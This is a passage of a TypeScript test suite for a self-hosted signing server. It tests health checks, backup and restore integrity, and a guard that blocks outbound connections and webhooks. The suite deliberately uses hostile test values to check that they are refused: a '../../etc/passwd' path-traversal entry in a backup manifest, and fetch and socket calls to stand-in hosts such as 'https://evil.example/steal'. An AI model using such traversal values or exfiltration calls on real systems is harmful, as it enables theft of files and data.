// Running the product yourself: GET /api/health in every state, the backup and restore scripts (a round trip that
// checks every audit chain and every stored file, and every way a backup that is not whole is refused), the one list
// of outside services and OUTSIDE_CALLS (the host list for several configurations, a stubbed outside call refused and
// a listed one allowed, the raw sockets nodemailer and webhooks open, webhooks at saving and at delivery), the
// security contact (security.txt and its rules), the software bill of materials, and the words of docs/.
// Nothing here reaches the network: fetch is stubbed, DNS answers are stubbed, and the only sockets go to this machine.
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import net from 'node:net';
import tls from 'node:tls';
import http from 'node:http';
import https from 'node:https';
import dns from 'node:dns';
import { spawnSync } from 'node:child_process';
import { boot, Client, signUp, simple, signAll, upload, type Server } from './helpers.ts';
import { health, noteTick, noteTickStart } from '../src/server/selfhost.ts';
import { HEALTH_CHECKS, HEALTH_MIN_FREE_BYTES, securityTxt, securityContacts, replyDays, securityContactWarning, SECURITY_TXT_DAYS } from '../src/lib/selfhost.ts';
import { outsideServices, outsidePolicy, hostAllowed, applyOutsideCalls, outsideMode, webhookRefusal, webhookHostsRule, hostList, onList, tsaHosts, outsideStartLines, refusalWords, isLoopback, NOT_BUILT } from '../src/lib/outside.ts';
import { installOutsideGuard, connectAllowed, logRefusal, OutsideRefused } from '../src/server/outside.ts';
import { tsaUrls } from '../src/server/tsa.ts';
import { resolvePublic, deliver } from '../src/server/webhooks.ts';
import { signInProviders } from '../src/lib/signin.ts';
import { smsProvider } from '../src/lib/checks.ts';
import { chatModelOn } from '../src/lib/chatprovider.ts';
import { keyIdOf } from '../src/server/filecrypt.ts';
import { decodeFileKey } from '../src/lib/storedfiles.ts';
import { GET as securityTxtRoute } from '../src/app/.well-known/security.txt/route.ts';
// @ts-ignore: plain JavaScript scripts, run by node
import { backup, MANIFEST, secretCheck } from '../scripts/backup.mjs';
// @ts-ignore
import { verifyBackup, restoreInto } from '../scripts/restore.mjs';
// @ts-ignore
import { checkLicences, makeSbom, idsOf } from '../scripts/sbom.mjs';

const ROOT = path.resolve(import.meta.dirname, '..');
const read = (f: string) => fs.readFileSync(path.join(ROOT, f), 'utf8');
const sha = (b: Uint8Array) => crypto.createHash('sha256').update(b).digest('hex');
const KEY = crypto.randomBytes(32).toString('base64');
const g = globalThis as any;
const made: string[] = [];
const tmp = (tag: string) => (made.push(fs.mkdtempSync(path.join(os.tmpdir(), `sg-selfhost-${tag}-`))), made[made.length - 1]);
after(() => made.forEach((d) => fs.rmSync(d, { recursive: true, force: true })));

let server: Server;
let alice: Client;
let completed: any;
before(async () => {
  // Every stored file in this test is encrypted, so a restore has to be given the key.
  process.env.FILE_ENCRYPTION_KEY = KEY;
  server = await boot();
  alice = await signUp('Alice Operator', 'alice@selfhost.example', '198.51.100.20');
  completed = await simple(alice, 'sam@selfhost.example');
  assert.equal((await alice.post(`/envelopes/${completed.id}/send`)).status, 200);
  assert.equal((await signAll(completed.id, 'sam@selfhost.example')).status, 200);
  const out = await simple(alice, 'tom@selfhost.example'); // one still out for signature
  assert.equal((await alice.post(`/envelopes/${out.id}/send`)).status, 200);
});

// ---- 1. GET /api/health ----------------------------------------------------------------------------------------------

test('health: 200 when everything works, and nothing about any account in the answer', async () => {
  const fresh = health({ fresh: true });
  assert.equal(fresh.ok, true, JSON.stringify(fresh));
  const r = await new Client().get('/health');
  assert.equal(r.status, 200, JSON.stringify(r.data));
  assert.deepEqual(Object.keys(r.data).sort(), ['checks', 'mail', 'ok', 'problems']);
  assert.deepEqual(Object.keys(r.data.checks), Object.keys(HEALTH_CHECKS));
  assert.ok(Object.values(r.data.checks).every((v) => v === 'ok'));
  assert.deepEqual(r.data.problems, []);
  assert.equal(r.data.mail, 'not configured');
  const text = JSON.stringify(r.data);
  for (const secretish of ['alice@selfhost.example', 'sam@selfhost.example', completed.id, process.env.DATA_DIR!, KEY]) assert.ok(!text.includes(secretish), `the answer holds ${secretish}`);
  // Mail set up is said, and is not a failure either way.
  process.env.SMTP_URL = 'smtp://relay.selfhost.example:25';
  try {
    assert.equal(health({ fresh: true }).mail, 'configured');
  } finally {
    delete process.env.SMTP_URL;
  }
});

test('health: each failure on its own gives 503 and says which, in words', async () => {
  const only = (h: any, k: string) => {
    assert.equal(h.ok, false);
    assert.deepEqual(Object.entries(h.checks).filter(([, v]) => v !== 'ok').map(([n]) => n), [k]);
    assert.deepEqual(h.problems, [(HEALTH_CHECKS as any)[k]]);
  };
  // The disk is nearly full.
  only(health({ fresh: true, freeBytes: () => HEALTH_MIN_FREE_BYTES - 1 }), 'disk_space');
  // The answer is reused for ten seconds, so the route now gives the same 503 a monitor would see.
  const r = await new Client().get('/health');
  assert.equal(r.status, 503);
  assert.equal(r.data.checks.disk_space, 'failed');
  assert.match(r.data.problems[0], /Less than 1 GB is free/);
  assert.equal(health({ fresh: true, freeBytes: () => HEALTH_MIN_FREE_BYTES + 1 }).ok, true);
  // DATA_DIR cannot be written to.
  only(health({ fresh: true, canWrite: () => false }), 'data_folder');
  // The database cannot be opened.
  const realDb = g.__tsdb;
  g.__tsdb = { prepare() { throw new Error('disk I/O error'); } };
  try {
    only(health({ fresh: true }), 'database');
  } finally {
    g.__tsdb = realDb;
  }
  // Storing files is stopped: a key that is not a key.
  process.env.FILE_ENCRYPTION_KEY = 'not a key';
  try {
    only(health({ fresh: true }), 'file_store');
  } finally {
    process.env.FILE_ENCRYPTION_KEY = KEY;
  }
  // The timer: not run since 31 minutes after the start, a run that hangs, a run that failed, one that is late.
  const now = Date.now();
  const saved = { tick: g.__sgTick, start: g.__sgStartedAt };
  try {
    g.__sgTick = undefined;
    g.__sgStartedAt = now - 10 * 60_000;
    assert.equal(health({ fresh: true, now }).checks.timer, 'ok', 'no run yet, and the first is not due');
    g.__sgStartedAt = now - 31 * 60_000;
    only(health({ fresh: true, now }), 'timer');
    noteTickStart(now - 31 * 60_000);
    only(health({ fresh: true, now }), 'timer');
    noteTick(false, now - 60_000);
    only(health({ fresh: true, now }), 'timer');
    noteTick(true, now - 31 * 60_000);
    only(health({ fresh: true, now }), 'timer');
    // A real run of the timer puts it right.
    await server.cron.tick();
    assert.equal(health({ fresh: true }).checks.timer, 'ok');
  } finally {
    g.__sgStartedAt = saved.start;
  }
  health({ fresh: true });
});

// ---- 2. Backup and restore -------------------------------------------------------------------------------------------

const dataDir = () => process.env.DATA_DIR!;
const restoreCli = (args: string[], env: Record<string, string | undefined>) => {
  const e: Record<string, string> = {};
  for (const [k, v] of Object.entries({ ...process.env, ...env })) if (v !== undefined) e[k] = v;
  return spawnSync(process.execPath, [path.join(ROOT, 'scripts/restore.mjs'), ...args], { cwd: tmp('cwd'), env: e, encoding: 'utf8' });
};
const tablesOf = (file: string) => {
  const { DatabaseSync } = (process as any).getBuiltinModule('node:sqlite');
  const d = new DatabaseSync(file, { readOnly: true });
  try {
    const out: Record<string, string[]> = {};
    for (const { name } of d.prepare("SELECT name FROM sqlite_master WHERE type='table' ORDER BY name").all() as any[])
      out[name] = (d.prepare(`SELECT * FROM "${name}"`).all() as any[]).map((r) => JSON.stringify(r)).sort();
    return out;
  } finally {
    d.close();
  }
};

let good: { dir: string; manifest: any };
let lateFile = '';
test('backup: a consistent copy while the server runs, with a manifest, and never a key', async () => {
  const dest = tmp('backups');
  // The health test above stopped the file store for a moment, and the alert about that is written a little later.
  // Wait for it, so nothing is written to the server's database between this backup and the comparison after it.
  for (let i = 0; i < 60 && !server.db.get("SELECT 1 x FROM support_requests WHERE email LIKE 'files-alert@%'"); i++) await new Promise((r) => setTimeout(r, 50));
  await new Promise((r) => setTimeout(r, 100));
  const secretFile = fs.readFileSync(path.join(dataDir(), 'secret'), 'utf8').trim();
  good = await backup({
    dataDir: dataDir(), dest,
    // Someone uploads a document after the stored files were copied and before the database is: the copy must hold both.
    onStep: async (step: string) => {
      if (step === 'files') lateFile = (await upload(alice, 1)).sha256 || server.db.get('SELECT sha256 FROM files ORDER BY created_at DESC LIMIT 1').sha256;
    },
  });
  const m = good.manifest;
  assert.match(path.basename(good.dir), /^backup-\d{4}-\d\d-\d\dT\d\d-\d\d-\d\dZ$/);
  assert.ok(fs.existsSync(path.join(good.dir, MANIFEST)));
  assert.ok(['sqlite-online-backup', 'vacuum-into'].includes(m.made_with.method));
  // Every stored file of the server is in it, byte for byte, the late one too.
  const blobs = fs.readdirSync(path.join(dataDir(), 'blobs')).filter((n) => /^[0-9a-f]{64}$/.test(n));
  assert.deepEqual(m.files.map((f: any) => f.path.slice(6)).sort(), blobs.sort());
  assert.ok(lateFile && blobs.includes(lateFile), 'the file uploaded during the backup');
  for (const n of blobs) assert.ok(fs.readFileSync(path.join(good.dir, 'blobs', n)).equals(fs.readFileSync(path.join(dataDir(), 'blobs', n))), n);
  // Its database row is in the copied database too.
  assert.ok(tablesOf(path.join(good.dir, 'sign.db')).files.some((r) => r.includes(lateFile)));
  // No key, no secret, anywhere in the backup: not as a file, not inside one.
  assert.deepEqual(fs.readdirSync(good.dir).sort(), ['blobs', MANIFEST, 'sign.db'].sort());
  assert.ok(m.left_out.includes('secret'));
  const walk = (d: string): string[] => fs.readdirSync(d, { withFileTypes: true }).flatMap((e) => (e.isDirectory() ? walk(path.join(d, e.name)) : [path.join(d, e.name)]));
  for (const f of walk(good.dir)) {
    const b = fs.readFileSync(f);
    for (const s of [secretFile, KEY]) assert.equal(b.indexOf(Buffer.from(s)), -1, `${f} holds a key`);
  }
  assert.equal(m.keys.app_secret, 'file');
  assert.equal(m.keys.app_secret_check, secretCheck(secretFile));
  assert.deepEqual(m.keys.file_key_ids, [keyIdOf(decodeFileKey(KEY)!)]);
  assert.equal(verifyBackup(good.dir).ok, true);
});

test('restore: a round trip gives the same database and files, every audit chain and file checks, and the keys are asked for', () => {
  const secretFile = fs.readFileSync(path.join(dataDir(), 'secret'), 'utf8').trim();
  // Without APP_SECRET: restored, and told what to set before starting.
  const t1 = path.join(tmp('restore'), 'data');
  let r = restoreCli([good.dir, t1], { FILE_ENCRYPTION_KEY: KEY, APP_SECRET: undefined, DATA_DIR: undefined });
  assert.equal(r.status, 3, r.stdout + r.stderr);
  assert.match(r.stderr, /APP_SECRET is not set\. The server that made this backup used a secret it made itself/);
  // With the secret and the key: everything checks.
  const t2 = path.join(tmp('restore'), 'data');
  r = restoreCli([good.dir, t2], { FILE_ENCRYPTION_KEY: KEY, APP_SECRET: secretFile, DATA_DIR: undefined });
  assert.equal(r.status, 0, r.stdout + r.stderr);
  assert.match(r.stdout, /Everything checks/);
  const n = good.manifest.files.length;
  assert.match(r.stdout, new RegExp(`${n} of ${n} stored files opened to their SHA-256`));
  // Byte for byte: the database as backed up, and every stored file as on the server.
  assert.equal(sha(fs.readFileSync(path.join(t2, 'sign.db'))), good.manifest.database.sha256);
  for (const f of good.manifest.files) assert.ok(fs.readFileSync(path.join(t2, f.path)).equals(fs.readFileSync(path.join(dataDir(), f.path))));
  // Row for row the same as the server's database (nothing has been written to it since the backup).
  assert.deepEqual(tablesOf(path.join(t2, 'sign.db')), tablesOf(path.join(dataDir(), 'sign.db')));
  // The audit chains the restore checked are the real ones: the completed envelope's checks here as well.
  assert.equal(server.env.verifyChain(completed.id).ok, true);
  // Without the file key: restored, and told which key is missing.
  const t3 = path.join(tmp('restore'), 'data');
  r = restoreCli([good.dir, t3], { FILE_ENCRYPTION_KEY: undefined, APP_SECRET: secretFile, DATA_DIR: undefined });
  assert.equal(r.status, 3, r.stdout + r.stderr);
  assert.match(r.stderr, new RegExp(`need a key that was not given \\(the backup's files use key id ${keyIdOf(decodeFileKey(KEY)!)}\\)`));
  // A different APP_SECRET is named as such.
  const t4 = path.join(tmp('restore'), 'data');
  r = restoreCli([good.dir, t4], { FILE_ENCRYPTION_KEY: KEY, APP_SECRET: 'another secret', DATA_DIR: undefined });
  assert.equal(r.status, 3);
  assert.match(r.stderr, /APP_SECRET is not the one the backup was made with/);
});

test('restore: a backup that is not whole is refused, and nothing is copied', async () => {
  const copy = (tag: string) => {
    const d = path.join(tmp(tag), path.basename(good.dir));
    fs.cpSync(good.dir, d, { recursive: true });
    return d;
  };
  const refused = (dir: string, why: RegExp) => {
    const v = verifyBackup(dir);
    assert.equal(v.ok, false);
    assert.match(v.problems.join(' '), why);
    const target = path.join(tmp('target'), 'data');
    const r = restoreCli([dir, target], { FILE_ENCRYPTION_KEY: KEY });
    assert.equal(r.status, 1, r.stdout + r.stderr);
    assert.match(r.stderr, /^Nothing was restored\./);
    assert.ok(!fs.existsSync(target) && !fs.existsSync(`${target}.restoring`), 'nothing copied');
  };
  // Stopped half way: the folder still ends in .partial and has no manifest.
  const dest = tmp('half');
  await assert.rejects(backup({ dataDir: dataDir(), dest, onStep: (s: string) => { if (s === 'database') throw new Error('power cut'); } }), /power cut/);
  const half = fs.readdirSync(dest).map((n) => path.join(dest, n));
  assert.equal(half.length, 1);
  assert.match(half[0], /\.partial$/);
  refused(half[0], /stopped before it finished/);
  // Its manifest taken away.
  const noManifest = copy('nomanifest');
  fs.rmSync(path.join(noManifest, MANIFEST));
  refused(noManifest, /There is no manifest\.json in it/);
  // One changed byte in a stored file.
  const changed = copy('changed');
  const victim = path.join(changed, good.manifest.files[0].path);
  const b = fs.readFileSync(victim);
  b[b.length - 1] ^= 1;
  fs.writeFileSync(victim, b);
  refused(changed, /is not the file that was backed up: its SHA-256 differs/);
  // A stored file missing.
  const missing = copy('missing');
  fs.rmSync(path.join(missing, good.manifest.files[1].path));
  refused(missing, /is missing/);
  // The database cut short.
  const cut = copy('cut');
  fs.truncateSync(path.join(cut, 'sign.db'), 4096);
  refused(cut, /sign\.db is 4096 bytes, and the manifest says/);
  // A manifest that names a file outside the backup is refused, not followed.
  const odd = copy('odd');
  const m = JSON.parse(fs.readFileSync(path.join(odd, MANIFEST), 'utf8'));
  m.files.push({ path: '../../etc/passwd', size: 1, sha256: 'x' });
  fs.writeFileSync(path.join(odd, MANIFEST), JSON.stringify(m));
  refused(odd, /lists a file this script never writes/);
  // A folder with something in it is never written into.
  const busy = path.join(tmp('busy'), 'data');
  fs.mkdirSync(busy, { recursive: true });
  fs.writeFileSync(path.join(busy, 'sign.db'), 'the running server');
  assert.throws(() => restoreInto(good.dir, busy), /is not empty/);
  assert.equal(fs.readFileSync(path.join(busy, 'sign.db'), 'utf8'), 'the running server');
  const r = restoreCli([good.dir, busy], { FILE_ENCRYPTION_KEY: KEY });
  assert.equal(r.status, 1);
  // --verify only looks.
  assert.equal(restoreCli(['--verify', good.dir], {}).status, 0);
  assert.equal(restoreCli(['--verify', changed], {}).status, 1);
});

// ---- 3. One list of outside services, and OUTSIDE_CALLS ---------------------------------------------------------------

const FULL = {
  SMTP_URL: 'smtps://user:pass@smtp.example.org:465', STRIPE_SECRET_KEY: 'sk_test_x', STRIPE_PRICE_GROVE: 'price_x', STRIPE_WEBHOOK_SECRET: 'whsec_x',
  GOOGLE_CLIENT_ID: 'g', GOOGLE_CLIENT_SECRET: 'gs', MICROSOFT_CLIENT_ID: 'm', MICROSOFT_CLIENT_SECRET: 'ms',
  TWILIO_ACCOUNT_SID: 'AC1', TWILIO_AUTH_TOKEN: 't', TWILIO_FROM: '+15550100',
  TSA_URL: 'https://tsa.example.net/tsr, https://tsa2.example.net', SUPPORT_CHAT_API_KEY: 'k', SUPPORT_CHAT_BASE_URL: 'https://llm.example.com/v1',
  CONVERTER_URL: 'http://gotenberg:3000', MAIL_EVENTS_TOKEN: 'a-long-enough-token-1234',
};
const hostsOf = (env: any) => Object.fromEntries(outsideServices(env).filter((s) => s.on).map((s) => [s.id, s.hosts]));

test('outside: the hosts the settings imply, for several configurations', () => {
  // Nothing set: the list of leaked passwords (on until PWNED_CHECK=0), and webhooks to whatever an admin enters.
  assert.deepEqual(hostsOf({}), { pwned: ['api.pwnedpasswords.com'], webhooks: [] });
  assert.deepEqual(hostsOf({ PWNED_CHECK: '0' }), { webhooks: [] });
  assert.deepEqual(hostsOf({ HIBP_RANGE_URL: 'https://leaks.intranet.example/range' }).pwned, ['leaks.intranet.example']);
  assert.equal(outsideServices({}).find((s) => s.id === 'webhooks')!.hostWords, 'any public https address an account admin enters');
  // Everything set.
  assert.deepEqual(hostsOf(FULL), {
    mail: ['smtp.example.org'], payments: ['api.stripe.com'], google: ['oauth2.googleapis.com', 'www.googleapis.com'], microsoft: ['login.microsoftonline.com'],
    sms: ['api.twilio.com'], tsa: ['tsa.example.net', 'tsa2.example.net'], chat: ['llm.example.com'], converter: ['gotenberg'], pwned: ['api.pwnedpasswords.com'], sns: [], webhooks: [],
  });
  // Text messages through a hook of one's own, the chat's default host, LibreOffice on this machine.
  assert.deepEqual(hostsOf({ PWNED_CHECK: '0', SMS_WEBHOOK_URL: 'https://texts.internal.example/send', OPENROUTER_API_KEY: 'k', CONVERTER: 'soffice' }), { sms: ['texts.internal.example'], chat: ['openrouter.ai'], webhooks: [] });
  // Half set up counts as off, as the features themselves read it.
  assert.deepEqual(hostsOf({ PWNED_CHECK: '0', GOOGLE_CLIENT_ID: 'g', TWILIO_ACCOUNT_SID: 'AC1', CONVERTER: 'gotenberg' }), { webhooks: [] });
  // The time-stamp hosts are read as src/server/tsa.ts reads them.
  for (const v of ['https://a.example/x,https://b.example', ' http://c.example ', 'ftp://no.example,https://d.example/tsr', '']) {
    process.env.TSA_URL = v;
    assert.deepEqual(tsaHosts({ TSA_URL: v }), tsaUrls().map((u) => new URL(u).hostname));
  }
  delete process.env.TSA_URL;
  // Lists: a pasted address counts as its host, junk is dropped, "*." is any name under.
  assert.deepEqual(hostList('https://Hooks.Example.org/x, *.Corp.Example. , bad host!, relay.example.org:587'), ['hooks.example.org', '*.corp.example', 'relay.example.org']);
  assert.deepEqual(hostList('a.example b.example, -x.example, *., c.example'), ['a.example', 'b.example', 'c.example']);
  assert.equal(onList(['*.corp.example'], 'a.b.corp.example'), true);
  assert.equal(onList(['*.corp.example'], 'corp.example'), false);
  assert.equal(onList(['*.corp.example'], 'evilcorp.example'), false);
  for (const h of ['localhost', '127.0.0.1', '127.8.9.10', '::1', '[::1]']) assert.ok(isLoopback(h), h);
  for (const h of ['localhost.evil.example', '128.0.0.1', '10.0.0.1']) assert.ok(!isLoopback(h), h);
});

test('outside: what each mode allows', () => {
  // all (and unset): nothing is held.
  assert.equal(outsideMode({}).mode, 'all');
  assert.equal(outsideMode({ OUTSIDE_CALLS: 'ALL' }).mode, 'all');
  assert.ok(hostAllowed(outsidePolicy(FULL), 'anything.example'));
  // listed: what the settings imply, OUTBOUND_ALLOW, the webhook hosts, this machine; SNS only by its shape.
  const listed = outsidePolicy({ ...FULL, OUTSIDE_CALLS: 'listed', OUTBOUND_ALLOW: 'proxy.internal', WEBHOOK_ALLOW_HOSTS: 'hooks.example.org' });
  for (const h of ['smtp.example.org', 'api.stripe.com', 'www.googleapis.com', 'login.microsoftonline.com', 'api.twilio.com', 'tsa2.example.net', 'llm.example.com', 'gotenberg', 'proxy.internal', 'hooks.example.org', 'localhost', 'sns.eu-west-1.amazonaws.com'])
    assert.ok(hostAllowed(listed, h), h);
  for (const h of ['evil.example', 'accounts.google.com', 'api.stripe.com.evil.example', 'sns.evil.example', 's3.amazonaws.com', '203.0.113.5'])
    assert.ok(!hostAllowed(listed, h), h);
  assert.match(refusalWords(listed, 'evil.example'), /^This server does not connect to evil\.example: OUTSIDE_CALLS=listed .* Add evil\.example to OUTBOUND_ALLOW if it should\.$/);
  // none: the mail relay and OUTBOUND_ALLOW only.
  const none = outsidePolicy({ ...FULL, OUTSIDE_CALLS: 'none', OUTBOUND_ALLOW: 'gotenberg' });
  assert.deepEqual(none.allow.sort(), ['gotenberg', 'smtp.example.org']);
  for (const h of ['api.stripe.com', 'llm.example.com', 'tsa.example.net', 'sns.eu-west-1.amazonaws.com']) assert.ok(!hostAllowed(none, h), h);
  assert.match(refusalWords(none, 'api.stripe.com'), /OUTSIDE_CALLS=none lets it reach only the mail relay and the hosts in OUTBOUND_ALLOW/);
  // A typo is the strictest, and the log says so.
  assert.deepEqual(outsideMode({ OUTSIDE_CALLS: 'nope' }), { mode: 'none', raw: 'nope', unknown: true });
  assert.ok(outsideStartLines({ OUTSIDE_CALLS: 'nope' }).some((l) => /is "nope", which is not all, listed or none\. It is read as none, the strictest/.test(l)));
  // The start line names every configured host and what it is for.
  const line = outsideStartLines(FULL)[0];
  assert.match(line, /^\[outside\] This server is configured to connect to: smtp\.example\.org \(mail relay\); api\.stripe\.com \(payment provider \(stripe\)\)/);
  assert.ok(outsideStartLines(FULL).some((l) => /OUTSIDE_CALLS is not set \(all\): nothing inside the software holds other connections/.test(l)));
});

test('outside: OUTSIDE_CALLS=none switches off every service that needs another host, so it is absent, and keeps mail', () => {
  const env: Record<string, string | undefined> = { ...FULL, OUTSIDE_CALLS: 'none', OUTBOUND_ALLOW: 'gotenberg' };
  const off = applyOutsideCalls(env);
  assert.deepEqual(off.map((s) => s.id), ['payments', 'google', 'microsoft', 'sms', 'tsa', 'chat', 'pwned']);
  // The leaked-password check is on without a setting, so it is switched off by one.
  assert.equal(env.PWNED_CHECK, '0');
  assert.deepEqual(off.find((s) => s.id === 'payments')!.settings, ['STRIPE_SECRET_KEY', 'STRIPE_PRICE_GROVE', 'STRIPE_WEBHOOK_SECRET']);
  for (const k of ['STRIPE_SECRET_KEY', 'GOOGLE_CLIENT_ID', 'MICROSOFT_CLIENT_SECRET', 'TWILIO_AUTH_TOKEN', 'TSA_URL', 'SUPPORT_CHAT_API_KEY']) assert.equal(env[k], undefined, k);
  // Each feature now reads itself as not set up, the same way as on a server where it never was.
  assert.deepEqual(signInProviders(env), []);
  assert.equal(smsProvider(env), null);
  assert.equal(chatModelOn(env), false);
  assert.deepEqual(tsaHosts(env), []);
  // Kept: the mail relay, the converter the operator allowed, and the inbound mail news (only its SNS link is refused).
  assert.equal(env.SMTP_URL, FULL.SMTP_URL);
  assert.equal(env.CONVERTER_URL, FULL.CONVERTER_URL);
  assert.equal(env.MAIL_EVENTS_TOKEN, FULL.MAIL_EVENTS_TOKEN);
  // A help chat on this machine itself needs no outside host and stays.
  const local: Record<string, string | undefined> = { OUTSIDE_CALLS: 'none', PWNED_CHECK: '0', SUPPORT_CHAT_API_KEY: 'k', SUPPORT_CHAT_BASE_URL: 'http://localhost:11434/v1' };
  assert.deepEqual(applyOutsideCalls(local), []);
  assert.equal(chatModelOn(local), true);
  // listed and all change nothing.
  const listed: Record<string, string | undefined> = { ...FULL, OUTSIDE_CALLS: 'listed' };
  assert.deepEqual(applyOutsideCalls(listed), []);
  assert.equal(listed.STRIPE_SECRET_KEY, FULL.STRIPE_SECRET_KEY);
});

test('outside: the guard refuses a stubbed outside call before it is made, allows a listed one, and logs once an hour', async () => {
  const realFetch = globalThis.fetch;
  const calls: string[] = [];
  globalThis.fetch = (async (input: any) => (calls.push(String(input?.url || input)), new Response('{}'))) as any;
  const logged: string[] = [];
  const realError = console.error;
  console.error = (...a: any[]) => void logged.push(a.join(' '));
  const undo = installOutsideGuard({ OUTSIDE_CALLS: 'listed', STRIPE_SECRET_KEY: 'sk', SMTP_URL: 'smtp://relay.example.org:25', OUTBOUND_ALLOW: 'extra.example.org' });
  try {
    assert.equal((await fetch('https://api.stripe.com/v1/customers')).status, 200);
    assert.equal((await fetch(new URL('https://extra.example.org/x'))).status, 200);
    assert.equal((await fetch('http://127.0.0.1:9/local')).status, 200);
    for (const input of ['https://evil.example/steal', new URL('https://evil.example/again'), new Request('https://other.example/x')])
      await assert.rejects(fetch(input as any), (e: any) => e instanceof OutsideRefused && /This server does not connect to (evil|other)\.example: OUTSIDE_CALLS=listed/.test(e.message) && /OUTBOUND_ALLOW/.test(e.message));
    assert.deepEqual(calls, ['https://api.stripe.com/v1/customers', 'https://extra.example.org/x', 'http://127.0.0.1:9/local'], 'nothing refused reached the network');
    // Once an hour for each host, not once a call.
    assert.equal(logged.filter((l) => l.includes('evil.example')).length, 1);
    assert.equal(logged.filter((l) => l.includes('other.example')).length, 1);
    const at = Date.now();
    assert.equal(logRefusal('evil.example', 'x', at), false);
    assert.equal(logRefusal('evil.example', 'x', at + 3601_000), true);
  } finally {
    undo();
    console.error = realError;
    globalThis.fetch = realFetch;
  }
  // Taken off, nothing is held any more, and mode all installs nothing.
  assert.equal(globalThis.fetch, realFetch);
  assert.equal(net.connect.name, 'connect');
  installOutsideGuard({})();
  assert.equal(globalThis.fetch, realFetch);
});

const refusedSocket = (s: net.Socket, host: RegExp) => new Promise<void>((resolve, reject) => {
  s.on('connect', () => reject(new Error('it connected')));
  s.on('error', (e: any) => (e.code === 'EOUTSIDE' && host.test(e.message) ? resolve() : reject(e)));
});

test('outside: the raw sockets of the mail relay and webhooks are held too, and a looked-up relay address counts as its name', async () => {
  // A stand-in for DNS, set before the guard so the guard wraps it: relay.example.org is this machine's own address.
  const own = Object.values(os.networkInterfaces()).flat().find((i) => i && i.family === 'IPv4' && !i.internal)?.address;
  const realLookup = dns.lookup, realR4 = dns.Resolver.prototype.resolve4, realR6 = dns.Resolver.prototype.resolve6;
  const fake = (name: string) => (name === 'relay.example.org' && own ? [own] : null);
  (dns as any).lookup = (h: string, o: any, cb?: any) => {
    const done = typeof o === 'function' ? o : cb;
    const a = fake(h);
    return a ? setImmediate(() => (o?.all ? done(null, a.map((address) => ({ address, family: 4 }))) : done(null, a[0], 4))) : (realLookup as any)(h, o, cb);
  };
  dns.Resolver.prototype.resolve4 = function (h: string, ...rest: any[]) {
    const done = rest[rest.length - 1];
    const a = fake(h);
    return a ? setImmediate(() => done(null, a)) : (realR4 as any).call(this, h, ...rest);
  } as any;
  dns.Resolver.prototype.resolve6 = function (h: string, ...rest: any[]) {
    const done = rest[rest.length - 1];
    return fake(h) ? setImmediate(() => done(null, [])) : (realR6 as any).call(this, h, ...rest);
  } as any;
  // A tiny mail server on this machine's own address, which says yes to everything.
  const got: string[] = [];
  const smtp = net.createServer((s) => {
    s.write('220 fake ESMTP\r\n');
    let data = false;
    s.on('data', (b) => {
      for (const line of b.toString().split('\r\n').filter(Boolean)) {
        if (data) {
          if (line === '.') (data = false), s.write('250 queued\r\n');
          else got.push(line);
        } else if (/^EHLO|^HELO/i.test(line)) s.write('250 fake\r\n');
        else if (/^DATA/i.test(line)) (data = true), s.write('354 go\r\n');
        else if (/^QUIT/i.test(line)) s.end('221 bye\r\n');
        else s.write('250 ok\r\n');
      }
    });
  });
  await new Promise<void>((r) => smtp.listen(0, own || '127.0.0.1', r));
  const port = (smtp.address() as net.AddressInfo).port;
  const undo = installOutsideGuard({ OUTSIDE_CALLS: 'none', SMTP_URL: `smtp://relay.example.org:${port}` });
  const nodemailer = (await import('nodemailer')).default as any;
  try {
    const p = g.__sgOutsidePolicy;
    // Names and addresses, as the guard decides them.
    assert.ok(!connectAllowed(p, '198.51.100.9'), 'an address nobody looked up');
    assert.ok(!connectAllowed(p, '198.51.100.9', 'evil.example'), 'TLS to an address in the name of a host that is not allowed');
    assert.ok(connectAllowed(p, '127.0.0.1'));
    // net.connect, tls.connect, https.request and http.request to a host that is not allowed fail at once, with the reason.
    await refusedSocket(net.connect({ host: 'evil.example', port: 25 }), /does not connect to evil\.example/);
    await refusedSocket(net.createConnection(25, '198.51.100.9'), /does not connect to 198\.51\.100\.9/);
    await refusedSocket(tls.connect({ host: '198.51.100.9', port: 443, servername: 'evil.example' }), /does not connect to evil\.example/);
    for (const mod of [https, http]) {
      const err: any = await new Promise((resolve) => mod.request(`${mod === https ? 'https' : 'http'}://evil.example/hook`, { method: 'POST' }).on('error', resolve).end('{}'));
      assert.equal(err.code, 'EOUTSIDE');
    }
    // nodemailer, which opens its own sockets: to a host that is not the relay, refused.
    const wrong = nodemailer.createTransport({ host: '198.51.100.9', port: 25, connectionTimeout: 3000 });
    await assert.rejects(wrong.sendMail({ from: 'a@x.example', to: 'b@x.example', subject: 's', text: 't' }), /does not connect to 198\.51\.100\.9/);
    if (own) {
      // To the relay by its name: nodemailer looks the name up and connects to the address, which counts as the relay.
      const relay = nodemailer.createTransport(`smtp://relay.example.org:${port}?connectionTimeout=3000&ignoreTLS=true`);
      await relay.sendMail({ from: 'a@x.example', to: 'b@x.example', subject: 'Through the guard', text: 'hello' });
      assert.ok(got.some((l) => /Subject: Through the guard/.test(l)), 'the relay got the email');
      assert.ok(connectAllowed(p, own), 'the address the relay name gave');
    }
  } finally {
    undo();
    smtp.close();
    (dns as any).lookup = realLookup;
    dns.Resolver.prototype.resolve4 = realR4;
    dns.Resolver.prototype.resolve6 = realR6;
  }
});

test('outside: webhooks go only to WEBHOOK_ALLOW_HOSTS, at saving and at delivery, and the page says so', async () => {
  const saved = { mode: process.env.OUTSIDE_CALLS, hosts: process.env.WEBHOOK_ALLOW_HOSTS };
  const realPLookup = dns.promises.lookup;
  try {
    // Mode all: any public https address, as before.
    assert.equal(webhookRefusal('203.0.113.5'), null);
    assert.equal((await alice.get('/webhooks')).data.allowed_hosts, null);
    // none, with no list: no webhook at all, said at saving, in the list and at delivery.
    process.env.OUTSIDE_CALLS = 'none';
    delete process.env.WEBHOOK_ALLOW_HOSTS;
    assert.deepEqual((await alice.get('/webhooks')).data.allowed_hosts, []);
    let r = await alice.post('/webhooks', { url: 'https://203.0.113.5/hook' });
    assert.equal(r.status, 400);
    assert.match(r.data.error, /^Webhooks are switched off on this server: it does not send anything to other systems\./);
    // listed, with a list.
    process.env.OUTSIDE_CALLS = 'listed';
    process.env.WEBHOOK_ALLOW_HOSTS = 'hooks.internal, *.corp.example';
    assert.deepEqual(webhookHostsRule(), ['hooks.internal', '*.corp.example']);
    r = await alice.post('/webhooks', { url: 'https://203.0.113.5/hook' });
    assert.equal(r.status, 400);
